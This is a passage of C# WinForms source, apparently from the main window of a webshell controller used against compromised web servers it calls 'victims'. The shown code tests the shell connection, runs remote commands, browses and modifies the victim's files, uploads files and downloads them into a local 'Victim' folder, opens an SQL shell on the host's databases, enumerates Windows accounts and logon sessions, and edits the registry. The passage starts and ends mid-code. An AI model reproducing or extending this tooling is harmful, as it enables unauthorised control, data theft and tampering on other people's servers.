                    var result = await m_dbMgr.fnSqlQueryEx(m_cfg, szQuery);
                    if (!result.bSuccess)
                        throw new Exception(result.szErrorMsg);

                    MessageBox.Show($"Table [{szTableName}] was successfully created.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion

        async Task<bool> fnbValidator()
        {
            if (!await m_web.fnbTestWebConnection())
            {
                MessageBox.Show("Website connection failed.", "fnbTestWebConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!await m_web.fnbTestShellConnection())
            {
                MessageBox.Show("Shell connection failed", "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        #region Tool

        private string[] GetPathParts(string path)
        {
            bool isRooted = m_victim.m_bUnixLike && path.StartsWith("/");

            var parts = path
                .Replace("\\", "/")
                .Split('/', StringSplitOptions.RemoveEmptyEntries);

            if (isRooted)
                parts = (new[] { "/" }).Concat(parts).ToArray();

            return parts;
        }
        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath)
        {
            return fnFindNodeWithFullPath(cNode, GetPathParts(szFullPath));
        }
        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
        {
            if (asName.Length == 0)
                return rootNode;

            foreach (TreeNode node in cNode)
            {
                if (string.Equals(node.Text, asName[0]))
                {
                    return fnFindNodeWithFullPath(node.Nodes, asName[1..], node);
                }
            }

            return null;
        }
        private clsfnFileMgr.stEntry fnFileGetItemTag(ListViewItem item) => (clsfnFileMgr.stEntry)item.Tag;

        private T? fnFindForm<T>() where T : Form
        {
            foreach (Form f in Application.OpenForms)
            {
                if (typeof(T).Name == f.GetType().Name)
                {
                    return (T)f;
                }
            }

            return null;
        }

        private int fnGetTabIndexAt(Point p)
        {
            for (int i = 0; i < tabControl4.TabPages.Count; i++)
            {
                if (tabControl4.GetTabRect(i).Contains(p))
                    return i;
            }
            return -1;
        }

        private Rectangle fnGetCloseRect(int i)
        {
            Rectangle tabRect = tabControl4.GetTabRect(i);

            return new Rectangle(
                tabRect.Right - 20,
                tabRect.Top + 4,
                15,
                15);
        }

        #endregion
        #region Info

        private async Task<string> fnszGetInfo()
        {
            toolStripStatusLabel1.Text = "Loading...";
            string szResp = await m_infoSpyder.fnszGetInfo();
            toolStripStatusLabel1.Text = "Action successfully.";

            return szResp;
        }

        #endregion
        #region FileMgr

        private TreeNode[] fnFileFindNodesWithText(TreeNodeCollection cNode, string szText)
        {
            List<TreeNode> lNode = new List<TreeNode>();
            foreach (TreeNode node in cNode)
            {
                if (node.Text == szText)
                    lNode.Add(node);
            }

            return lNode.ToArray();
        }

        void fnFileAddPathToTreeView(string szDirPath)
        {
            bool isRooted = m_victim.m_bUnixLike && szDirPath.StartsWith("/");

            string[] asDirPath = szDirPath
                .Replace("\\", "/")
                .Split('/', StringSplitOptions.RemoveEmptyEntries);

            if (isRooted)
            {
                asDirPath = (new[] { "/" }).Concat(asDirPath).ToArray();
            }

            fnFileAddPathToTreeView(asDirPath);
        }
        void fnFileAddPathToTreeView(string[] asDirPath, TreeNode node = null)
        {
            if (asDirPath.Length == 0)
                return;

            string szDir = asDirPath[0];

            TreeNodeCollection nodes = node == null ? treeView3.Nodes : node.Nodes;

            TreeNode[] aNode = fnFileFindNodesWithText(nodes, szDir);

            if (aNode.Length == 0)
            {
                TreeNode newNode = new TreeNode(szDir);
                nodes.Add(newNode);
                aNode = new[] { newNode };
            }

            fnFileAddPathToTreeView(asDirPath[1..], aNode[0]);
        }

        public async void fnFileMgrRefresh() => Invoke(new Action(() => fnFileScandir(m_fileMgr.m_szCurrentPath)));

        async void fnFileScandir(string szDir)
        {
            listView2.Items.Clear();

            szDir = szDir.Replace("\r\n", string.Empty).Replace(Environment.NewLine, string.Empty).Trim('\n').Replace("\\", "/").Replace("//", "/");
            textBox1.Text = szDir;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
            if (node == null)
                node = fnFindNodeWithFullPath(treeView3.Nodes, szDir.Replace("\\", string.Empty));

            var le = await m_fileMgr.fnleScandir(szDir);
            var leFolder = le.Where(x => !string.IsNullOrEmpty(x.szEntryName.Trim())).Where(x => x.bIsDirectory).ToList();
            var leFile = le.Where(x => !string.IsNullOrEmpty(x.szEntryName.Trim())).Where(x => !x.bIsDirectory).ToList();

            if (leFolder.Count == 0 && leFile.Count == 0)
            {
                if (node.Nodes.Count > 0)
                {
                    MessageBox.Show("Access denial: " + szDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }

                toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";

                return;
            }

            // TreeView
            if (node.Nodes.Count > 0)
            {
                List<TreeNode> nodes = node.Nodes.Cast<TreeNode>().ToList();
                var lsFolder = leFolder.Select(x => x.szEntryName);
                foreach (var n in nodes)
                {
                    if (!lsFolder.Contains(n.Text))
                    {
                        treeView3.Nodes.Remove(n);
                    }
                }
            }

            // ListView
            foreach (var entry in leFolder.Concat(leFile))
            {
                ListViewItem item = new ListViewItem(entry.szEntryName);
                item.SubItems.Add(entry.szPriviledge);
                item.SubItems.Add(entry.nSize.ToString());
                item.SubItems.Add(entry.dtCreationDate.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture));
                item.SubItems.Add(entry.dtLastModifiedDate.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture));
                item.SubItems.Add(entry.dtLastAccessedDate.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture));

                string szExtension = entry.szEntryName.Split('.').Last();
                if (!entry.bIsDirectory)
                    m_fileMgr.fnGetExtensionIcon(szExtension);

                item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;

                item.Tag = entry;

                listView2.Items.Add(item);

                if (node != null && entry.bIsDirectory && fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath) == null)
                {
                    TreeNode newNode = new TreeNode(entry.szEntryName);
                    int nIdx = 0;
                    while (
                        node.Nodes.Count > 0
                        && nIdx < node.Nodes.Count
                        && string.Compare(newNode.Text, node.Nodes[nIdx].Text) > 0
                    )
                    {
                        nIdx++;
                    }

                    node.Nodes.Insert(nIdx, newNode);
                }
            }

            node?.Expand();

            toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";
        }

        async void fnFileDisplayAllImage()
        {
            List<string> lsImagePath = new List<string>();
            foreach (ListViewItem item in listView2.Items)
            {
                var entry = fnFileGetItemTag(item);
                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
                    lsImagePath.Add(entry.szEntryPath);
            }

            if (lsImagePath.Count == 0)
            {
                MessageBox.Show("List is empty");
                return;
            }

            await fnFileDisplayImage(lsImagePath);
        }
        async Task fnFileDisplayImage(List<string> lsImagePath)
        {
            if (lsImagePath.Count == 0)
            {
                MessageBox.Show("List is empty", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            frmFileImage? f = fnFindForm<frmFileImage>();
            if (f == null)
            {
                f = new frmFileImage(m_victim, lsImagePath.Count);
                f.Text = "DisplayImage";

                f.Show();
            }
            else
            {
                f.BringToFront();
                f.Focus();
            }

            foreach (string szFilePath in lsImagePath)
            {
                Image img = await m_fileMgr.fnReadImage(szFilePath);
                if (img == null)
                {
                    MessageBox.Show("Failed to read image: " + szFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                f.fnAddImage(szFilePath, img);
            }
        }

        async void fnFileRead(string szFilePath)
        {
            frmTextEditor? f = fnFindForm<frmTextEditor>();
            if (f == null)
            {
                f = new frmTextEditor(this);
                f.Show();
            }

            f.BringToFront();

            string szContent = await m_fileMgr.fnszRead(szFilePath);
            f.fnShowContent(szFilePath, szContent);
        }

        public async Task<bool> fnbFileWrite(string szFilePath, string szContent)
        {
            if (await m_fileMgr.fnbWrite(szFilePath, szContent))
            {
                toolStripStatusLabel1.Text = "Action successfully.";
                return true;
            }
            else
            {
                MessageBox.Show("Write file failed.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        async void fnFileDirExists(string szDirPath)
        {
            szDirPath = await m_fileMgr.fnszCheckPathExists(szDirPath);
            if (string.IsNullOrEmpty(szDirPath))
            {
                textBox1.Text = m_fileMgr.m_szCurrentPath;
                return;
            }

            fnFileAddPathToTreeView(szDirPath);

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDirPath);
            treeView3.SelectedNode = node;
        }

        public async Task<Dictionary<string, bool>> fnFileUpload(List<string> lsSrcFilePath, int nThread = 3, int nChunkSize = 5 * 1024, Action fnOnCallback = null)
        {
            tabControl6.SelectedIndex = 1;
            m_fileMgr.m_bUploadFile = true;

            string szCurrentDir = m_fileMgr.m_szCurrentPath;
            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
            Dictionary<string, TreeNode> dicNode = new Dictionary<string, TreeNode>();

            TreeNode nodeUpload = treeView4.Nodes[0];

            foreach (string szSrcFilePath in lsSrcFilePath)
            {
                long nFileSize = -1;

                if (nFileSize == -1)
                {
                    FileInfo info = new FileInfo(szSrcFilePath);
                    nFileSize = info.Length;
                }

                string szFileName = Path.GetFileName(szSrcFilePath);
                TreeNode node = new TreeNode($"[0%|0/{nFileSize}]{szFileName}");
                node.Tag = 0;
                nodeUpload.Nodes.Add(node);

                dicNode.Add(szSrcFilePath, node);

                nodeUpload.Expand();
            }

            List<Task> lsTask = new List<Task>();
            using (SemaphoreSlim semaphore = new SemaphoreSlim(nThread))
            {
                foreach (string szSrcFilePath in lsSrcFilePath)
                {
                    if (!m_fileMgr.m_bUploadFile)
                        break;

                    try
                    {
                        long nFileSize = -1;

                        string szFileName = Path.GetFileName(szSrcFilePath);
                        string szDstFilePath = Path.Combine(szCurrentDir, szFileName).Replace("\\", "/");

                        if (nFileSize == -1)
                        {
                            FileInfo info = new FileInfo(szSrcFilePath);
                            nFileSize = info.Length;
                        }

                        long nProgress = 0;

                        TreeNode node = dicNode[szSrcFilePath];
                        node.Tag = nProgress;

                        Action act = () =>
                        {
                            Invoke(new Action(() =>
                            {
                                nProgress = (long)node.Tag;
                                nProgress += nChunkSize;
                                node.Tag = nProgress;

                                string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
                                node.Text = $"[{szProgress}%|{nProgress}/{nFileSize}]{szFileName}";

                                if (nProgress >= nFileSize)
                                {
                                    nodeUpload.Nodes.Remove(node);
                                }
                            }));
                        };

                        lsTask.Add(Task.Run(async () =>
                        {
                            await semaphore.WaitAsync();

                            try
                            {
                                bool bRet = await m_fileMgr.fnbFileUpload(szSrcFilePath, szDstFilePath, nChunkSize, act, fnOnCallback);
                                dicState[szFileName] = bRet;

                                Invoke(new Action(() =>
                                {
                                    if (dicNode.ContainsKey(szSrcFilePath))
                                        dicNode.Remove(szSrcFilePath);
                                }));
                            }
                            finally
                            {
                                semaphore.Release();
                            }
                        }));

                        await Task.WhenAll(lsTask);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        break;
                    }
                }
            }

            return dicState;
        }

        public async Task<(Dictionary<string, bool> dicState, string szSaveDirPath)> fnFileDownload(List<(string, long)> lsRemoteFile, int nThread = 3, int nChunkSize = 5 * 1024, Action fnCallback = null)
        {
            tabControl6.SelectedIndex = 1;
            m_fileMgr.m_bDownloadFile = true;

            string szLocalSaveDirPath = Path.Combine("Victim", m_victim.m_szShellDomain, "Downloads");
            if (!Directory.Exists(szLocalSaveDirPath))
                Directory.CreateDirectory(szLocalSaveDirPath);

            List<string> lsRemoteFilePath = lsRemoteFile.Select(x => x.Item1).ToList();
            lsRemoteFilePath = lsRemoteFilePath.Select(x => x.Replace("\\", "/")).ToList();

            Dictionary<string, bool> dicState = new Dictionary<string, bool>();
            Dictionary<string, TreeNode> dicNode = new Dictionary<string, TreeNode>();
            TreeNode nodeDownload = treeView4.Nodes[1];

            for (int i = 0; i < lsRemoteFilePath.Count; i++)
            {
                string szRemoteFilePath = lsRemoteFilePath[i];
                long nFileSize = lsRemoteFile[i].Item2; // bytes

                string szFileName = Path.GetFileName(szRemoteFilePath);

                TreeNode node = new TreeNode($"[0%|0/{nFileSize}]{szFileName}");
                node.Tag = 0;
                nodeDownload.Nodes.Add(node);

                dicNode.Add(szRemoteFilePath, node);

                nodeDownload.Expand();
            }

            List<Task> lsTask = new List<Task>();
            using (SemaphoreSlim semaphore = new SemaphoreSlim(nThread))
            {
                for (int i = 0; i < lsRemoteFile.Count; i++)
                {
                    if (!m_fileMgr.m_bDownloadFile)
                        break;

                    string szRemoteFilePath = lsRemoteFilePath[i];
                    string szFileName = Path.GetFileName(szRemoteFilePath);
                    string szLocalFilePath = Path.Combine(szLocalSaveDirPath, szFileName);

                    long nFileSize = -1;
                    long nProgress = 0;

                    TreeNode node = dicNode[szRemoteFilePath];
                    node.Tag = nProgress;

                    if (nFileSize == -1)
                        nFileSize = lsRemoteFile[i].Item2;

                    Action act = () =>
                    {
                        Invoke(new Action(() =>
                        {
                            nProgress = (long)node.Tag;
                            nProgress += nChunkSize;
                            node.Tag = nProgress;

                            string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
                            node.Text = $"[{szProgress}%|{nProgress}/{nFileSize}]{szFileName}";

                            if (nProgress >= nFileSize)
                            {
                                nodeDownload.Nodes.Remove(node);
                            }
                        }));
                    };

                    lsTask.Add(Task.Run(async () =>
                    {
                        await semaphore.WaitAsync();

                        try
                        {
                            bool bRet = await m_fileMgr.fnbFileDownload(szRemoteFilePath, szLocalFilePath, nChunkSize, act, fnCallback);
                            dicState[szRemoteFilePath] = bRet;

                            Invoke(new Action(() =>
                            {
                                if (dicNode.ContainsKey(szRemoteFilePath))
                                    dicNode.Remove(szRemoteFilePath);
                            }));
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));

                    await Task.WhenAll(lsTask);
                }
            }

            return (dicState, szLocalSaveDirPath);
        }

        public void fnFileNewFile()
        {
            frmTextEditor? f = fnFindForm<frmTextEditor>();
            if (null == f)
            {
                f = new frmTextEditor(this);
                f.Show();
            }

            f.BringToFront();

            string szFileName = clsTool.fnszGenerateFileNameWithDateTime("txt");
            string szFilePath = Path.Combine(m_fileMgr.m_szCurrentPath, szFileName).Replace("\\", "/");
            f.fnShowContent(szFilePath, string.Empty);
        }

        public async Task<bool> fnbFileDelete(string szDstEntry)
        {
            return await m_fileMgr.fnbDelete(szDstEntry);
        }
        public async Task<bool> fnbFileDelete(clsfnFileMgr.stEntry entry) => await fnbFileDelete((entry.bIsDirectory ? entry.szEntryPath + "/" : entry.szEntryPath).Replace("\\", "/"));

        #endregion
        #region Shell

        async void fnShellInit()
        {
            richTextBox1.BackColor = Color.Black;
            richTextBox1.ForeColor = m_victim.m_bUnixLike ? Color.Cyan : Color.White;
            richTextBox1.Font = new Font("Consolas", Font.Size);

            string szCommand = m_victim.m_bUnixLike ? "uname -a" : "ver";
            await fnShellExecute(szCommand);

            string szInitCommand = $"netstat -ano | {(m_victim.m_bUnixLike ? "grep" : "find")} \"ESTABLISHED\"";
            richTextBox1.AppendText(szInitCommand);
        }

        async Task fnShellExecute(string szCommand)
        {
            var ret = await m_rShell.fnShellExecute(szCommand);
            string[] asOutput = ret.szOutput.Replace("\r\n", "\n").Split('\n');

            richTextBox1.SelectionFont = richTextBox1.Font;
            richTextBox1.AppendText(string.Join(Environment.NewLine, asOutput));
            richTextBox1.AppendText(Environment.NewLine);

            ret.szCurrentDir = ret.szCurrentDir.Replace("\r\n", "\n").Replace("\n", string.Empty);

            string szPrompt = $"{(m_victim.m_bUnixLike ? $"{ret.szCurrentDir}$ " : $"{ret.szCurrentDir}> ")}";
            richTextBox1.SelectionFont = richTextBox1.Font;
            richTextBox1.AppendText(szPrompt);
            richTextBox1.Focus();

            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            richTextBox1.SelectionLength = 0;
            richTextBox1.SelectionFont = richTextBox1.Font;

            richTextBox1.Tag = richTextBox1.Text.Length;
        }

        #endregion
        #region Database

        public async void fnDbInit()
        {
            // UI init

            toolStripLabel1.Text = "Loading...";

            tabControl4.TabPages.Clear();

            treeView2.Nodes.Clear();
            listView4.Items.Clear();
            foreach (TabPage tab in tabControl4.TabPages)
                tabControl4.TabPages.Remove(tab);

            // Scan available modules.
            var lsDb = await m_dbMgr.fnDbInit();
            foreach (var module in lsDb)
            {
                ListViewItem item = new ListViewItem(module.Item1);
                item.SubItems.Add(module.Item2 ? "YES" : "NO");

                listView4.Items.Add(item);
            }

            // Load database config from *.sqlite file.
            var ls = m_dbMgr.fnGetAllDbConfig();
            foreach (var db in ls)
            {
                TreeNode node = new TreeNode(db.szSource);
                node.Tag = db;

                string? szDb = Enum.GetName(typeof(enDatabase), db.enDbType);
                if (string.IsNullOrEmpty(szDb))
                    continue;

                node.ImageKey = szDb.ToLower();
                node.SelectedImageKey = node.ImageKey;

                treeView2.Nodes.Add(node);
            }

            toolStripLabel1.Text = $"Database[{treeView2.Nodes.Count}]";
        }

        void fnDbShowTablePage(TreeNode nodeSelected, string szHost, string szDbName, List<string> lsTable)
        {
            TabPage page = new TabPage($"Table[{szHost}] - {szDbName}");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            var config = (clsfnDb.stDbConfig)nodeSelected.Parent.Tag;

            clsDbTablePageControls ctrls = new clsDbTablePageControls(m_dbMgr, config, nodeSelected, page, dbImageList, menuDbTable);
            ctrls.listView.DoubleClick += async (s, e) =>
            {
                if (ctrls.listView.SelectedItems.Count == 0)
                    return;

                ListViewItem item = ctrls.listView.SelectedItems[0];
                string szTable = item.Text;

                var config = m_dbMgr.m_stDbConfig[szHost];
                string szQuery = m_dbMgr.fnBuildDataQuery(config.enDbType, szDbName, szTable);
                DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);

                fnDbShowData(config, dt, szQuery, szDbName, szTable);
            };
            ctrls.textBox.KeyDown += (s, e) =>
            {
                Task.Run(() =>
                {
                    List<string> lsMatched = ctrls.m_lsLastTable.Where(x => x.Contains(ctrls.textBox.Text, StringComparison.OrdinalIgnoreCase)).ToList();
                    Invoke(() =>
                    {
                        ctrls.listView.Clear();

                        foreach (var table in lsMatched)
                        {
                            ListViewItem item = new ListViewItem(table);
                            item.ImageKey = "table";

                            ctrls.listView.Items.Add(item);
                        }
                    });
                });
            };

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            // Show tables
            if (ctrls.m_lsLastTable.Count > 0)
                ctrls.m_lsLastTable.Clear();

            List<string> lsExistedTable = nodeSelected.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();

            foreach (string szTable in lsTable)
            {
                if (ctrls.listView.FindItemWithText(szTable) == null)
                {
                    ListViewItem item = new ListViewItem(szTable);
                    item.ImageKey = "table";

                    ctrls.listView.Items.Add(item);
                }

                string szNodePath = $"{szHost}\\{szDbName}\\{szTable}";
                if (fnFindNodeWithFullPath(nodeSelected.Nodes, szNodePath) == null)
                {
                    if (lsExistedTable.Contains(szTable))
                        continue;

                    TreeNode node = new TreeNode(szTable);
                    node.ImageKey = "table";
                    node.SelectedImageKey = node.ImageKey;

                    nodeSelected.Nodes.Add(node);
                }

                ctrls.m_lsLastTable.Add(szTable);
            }

            nodeSelected.Expand();
        }

        void fnDbShowData(clsfnDb.stDbConfig config, DataTable data, string szQuery, string szDbName, string szTable)
        {
            TabPage page = new TabPage($"Result[{config.szSource}]");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            clsDbSqlResultControls ctrls = new clsDbSqlResultControls(page, config, m_dbMgr, szDbName, szTable);
            ctrls.textBox.Text = szQuery;
            ctrls.dataGridView.DataSource = data;

            if (data.Rows.Count == 0)
            {
                MessageBox.Show($"Cannot fine any data in the table [{szTable}]", "Empty", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                DataRow row = data.NewRow();
                data.Rows.Add(row);
            }
        }

        void fnDbShowSqlQuery(clsfnDb.stDbConfig config, string szDbName)
        {
            TabPage page = new TabPage($"SQL[{config.szSource}]");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            clsDbSqlShellControls ctrls = new clsDbSqlShellControls(page, config, m_dbMgr);
            ctrls.richTextBox.AppendText("SQL Shell\n\n");
            ctrls.richTextBox.AppendText(ctrls.m_szPrompt);
            ctrls.richTextBox.SelectionStart = ctrls.richTextBox.Text.Length;
            ctrls.m_nPromitStart = ctrls.richTextBox.Text.Length;
            ctrls.richTextBox.KeyDown += async (s, e) =>
            {
                int nPrompt = ctrls.m_nPromitStart;

                if (e.KeyCode == Keys.Enter)
                {
                    e.SuppressKeyPress = true;

                    string szCmd = ctrls.richTextBox.Text.Substring(nPrompt);
                    if (string.IsNullOrEmpty(szCmd))
                        return;

                    ctrls.richTextBox.AppendText("\n\n");

                    DataTable dt = await m_dbMgr.fnSqlQuery(config, szCmd);

                    if (dt != null)
                    {
                        ctrls.richTextBox.AppendText(clsfnDb.fnPrintTable(dt));
                        ctrls.richTextBox.AppendText("\n");
                    }

                    ctrls.richTextBox.AppendText(ctrls.m_szPrompt);
                    ctrls.richTextBox.ScrollToCaret();

                    ctrls.m_nPromitStart = ctrls.richTextBox.TextLength;

                    ctrls.fnPushSQL(szCmd);

                    return;
                }

                if (e.KeyCode == Keys.Up)
                {
                    e.Handled = true;
                    e.SuppressKeyPress = true;

                    string szSQL = ctrls.fnPreviousSQL();

                    ctrls.richTextBox.Text = ctrls.richTextBox.Text.Substring(0, ctrls.m_nPromitStart);
                    ctrls.richTextBox.AppendText(szSQL);
                }

                if (e.KeyCode == Keys.Down)
                {
                    e.Handled = true;
                    e.SuppressKeyPress = true;

                    string szSQL = ctrls.fnNextSQL();

                    ctrls.richTextBox.Text = ctrls.richTextBox.Text.Substring(0, ctrls.m_nPromitStart);
                    ctrls.richTextBox.AppendText(szSQL);
                }

                if ((e.KeyCode == Keys.Back || e.KeyCode == Keys.Left) && ctrls.richTextBox.SelectionStart <= nPrompt && ctrls.richTextBox.SelectionLength == 0)
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.KeyCode == Keys.Delete && ctrls.richTextBox.SelectionStart <= nPrompt && ctrls.richTextBox.SelectionLength == 0)
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.Control && e.KeyCode == Keys.V && ctrls.richTextBox.SelectionStart < nPrompt)
                {
                    e.SuppressKeyPress = true;
                    return;
                }
            };
            ctrls.richTextBox.KeyPress += (s, e) =>
            {
                int nPrompt = ctrls.m_nPromitStart;
                if (ctrls.richTextBox.SelectionStart < nPrompt)
                {
                    e.Handled = true;
                };
            };
        }

        async void fnDbShowInformation(clsfnDb.stDbConfig config)
        {
            TabPage page = new TabPage($"Info[{config.szSource}]");
            foreach (TabPage p in tabControl4.TabPages)
            {
                if (string.Equals(p.Text, page.Text))
                {
                    page = p;
                    break;
                }
            }

            if (!tabControl4.TabPages.Contains(page))
                tabControl4.TabPages.Add(page);

            tabControl4.SelectedTab = page;

            clsDbInformation ctrls = new clsDbInformation(page, config);

            DataTable dt = await m_dbMgr.fnDbInfo(config);
            DataTable dtNew = new DataTable();

            dtNew.Columns.Add("Field");
            dtNew.Columns.Add("Value");

            for (int i = 0; i < dt.Columns.Count; i++)
            {
                DataColumn dc = dt.Columns[i];
                DataRow dr = dt.Rows[0];

                dtNew.Rows.Add(dc.ColumnName, dr[i]);
            }

            ctrls.richTextBox.Clear();
            ctrls.richTextBox.AppendText(clsfnDb.fnPrintTable(dtNew));
        }

        #endregion
        #region Linux

        async Task fnLinuxGetApp()
        {
            toolStripStatusLabel11.Text = "Loading...";

            var json = await m_infoSpyder.fnGetAppServ();

            if (json == null)
                throw new Exception("JSON object is null");

            if (!json.success)
                throw new Exception(json.error);

            listView11.View = View.Details;

            listView11.Items.Clear();
            listView11.Columns.Clear();

            listView11.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
            listView11.Columns.Add(new ColumnHeader() { Text = "Version", Width = 120, });
            listView11.Columns.Add(new ColumnHeader() { Text = "Vendor", Width = 120, });

            foreach (var app in json.data.applications)
            {
                ListViewItem item = new ListViewItem(app.name);
                item.SubItems.Add(app.version);
                item.SubItems.Add(app.vendor);

                listView11.Items.Add(item);
            }

            toolStripStatusLabel11.Text = $"Application[{listView11.Items.Count}]";
        }
        async Task fnLinuxGetService()
        {
            toolStripStatusLabel12.Text = "Loading...";

            var json = await m_infoSpyder.fnGetAppServ();

            if (json == null)
                throw new Exception("JSON object is null");

            if (!json.success)
                throw new Exception(json.error);

            listView12.View = View.Details;

            listView12.Items.Clear();
            listView12.Columns.Clear();

            listView12.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
            listView12.Columns.Add(new ColumnHeader() { Text = "DisplayName", Width = 200, });
            listView12.Columns.Add(new ColumnHeader() { Text = "Status", Width = 200, });

            foreach (var service in json.data.services)
            {
                ListViewItem item = new ListViewItem(service.display_name);
                item.SubItems.Add(service.display_name);
                item.SubItems.Add(service.status);

                listView12.Items.Add(item);
            }

            toolStripStatusLabel12.Text = $"Application[{listView12.Items.Count}]";
        }

        #endregion
        #region Windows

        #region Users

        async Task fnWinUserInit()
        {
            void fnLoadWmiToListView(ListView listView, List<clsfnWinUser.WmiRow> data)
            {
                if (listView == null || data == null || data.Count == 0)
                    return;

                listView.BeginUpdate();

                listView.Clear();
                listView.View = View.Details;
                listView.FullRowSelect = true;
                listView.GridLines = true;

                var templateRow = data.FirstOrDefault(r => r?.Data != null && r.Data.Count > 0);

                if (templateRow == null)
                {
                    listView.EndUpdate();
                    return;
                }

                var columnList = templateRow.Data.Keys.ToList();

                foreach (var col in columnList)
                    listView.Columns.Add(col);

                foreach (var row in data)
                {
                    if (row?.Data == null || row.Data.Count == 0)
                        continue;

                    var item = new ListViewItem();
                    bool hasValue = false;

                    for (int i = 0; i < columnList.Count; i++)
                    {
                        row.Data.TryGetValue(columnList[i], out string? value);
                        value ??= "";

                        if (value != "") hasValue = true;

                        if (i == 0)
                            item.Text = value;
                        else
                            item.SubItems.Add(value);
                    }

                    if (hasValue)
                        listView.Items.Add(item);
                }

                listView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);

                listView.EndUpdate();
            }

            try
            {
                toolStripStatusLabel5.Text = "Loading...";

                listView5.View = View.Details;
                listView6.View = View.Details;
                listView7.View = View.Details;
                listView8.View = View.Details;
                listView9.View = View.Details;
                listView10.View = View.Details;

                listView5.Columns.Clear();
                listView6.Columns.Clear();
                listView7.Columns.Clear();
                listView8.Columns.Clear();
                listView9.Columns.Clear();
                listView10.Columns.Clear();

                listView5.Items.Clear();
                listView6.Items.Clear();
                listView7.Items.Clear();
                listView8.Items.Clear();
                listView9.Items.Clear();
                listView10.Items.Clear();

                var result = await m_winUser.fnGetData();

                fnLoadWmiToListView(listView5, result.UserAccounts);
                fnLoadWmiToListView(listView6, result.UserProfiles);
                fnLoadWmiToListView(listView7, result.Groups);
                fnLoadWmiToListView(listView8, result.GroupUsers);
                fnLoadWmiToListView(listView9, result.LoggedOn);
                fnLoadWmiToListView(listView10, result.LogonSession);

                toolStripStatusLabel5.Text = "Action successfully.";
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnWinUserInit", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion
        #region Registry

        private async Task fnRegInit()
        {
            listView3.Items.Clear();
            treeView5.Nodes.Clear();
            textBox7.Clear();

            listView3.GridLines = true;

            var dicHives = await m_winReg.fnHives();

            TreeNode nodePC = new TreeNode("Computer");
            nodePC.ImageKey = "computer";
            nodePC.SelectedImageKey = nodePC.ImageKey;

            treeView5.Nodes.Add(nodePC);

            foreach (string szKey in dicHives.Keys)
            {
                TreeNode node = new TreeNode(szKey);
                node.ImageKey = "key";
                node.SelectedImageKey = node.ImageKey;

                nodePC.Nodes.Add(node);
            }

            nodePC.Expand();
        }

        private void fnRegRefresh()
        {
            if (string.IsNullOrEmpty(m_winReg.m_szCurrentPath))
                return;

            string szFullPath = "Computer\\" + m_winReg.m_szCurrentPath;
            TreeNode node = fnFindNodeWithFullPath(treeView5.Nodes, szFullPath);
            if (node == null)
                return;

            listView3.Items.Clear();
            treeView5.SelectedNode = null;
            treeView5.SelectedNode = node;
        }


        private void fnRegSetValue(string szName, string szType, string szValue)
        {
            frmRegEditString f = new frmRegEditString(m_winReg, m_winReg.m_szCurrentPath, szName, szType, szValue);
            f.Text = "Edit Value";

            f.ShowDialog();

            fnRegRefresh();
        }
        private void fnRegSetValue(string szName, string szType, ulong nValue)
        {
            frmRegEditWord f = new frmRegEditWord(m_winReg, m_winReg.m_szCurrentPath, szName, szType, nValue);
            f.Text = "Edit Value";

            f.ShowDialog();

            fnRegRefresh();
        }
        private void fnRegSetValue(string szName, string szType, byte[] abValue)
        {
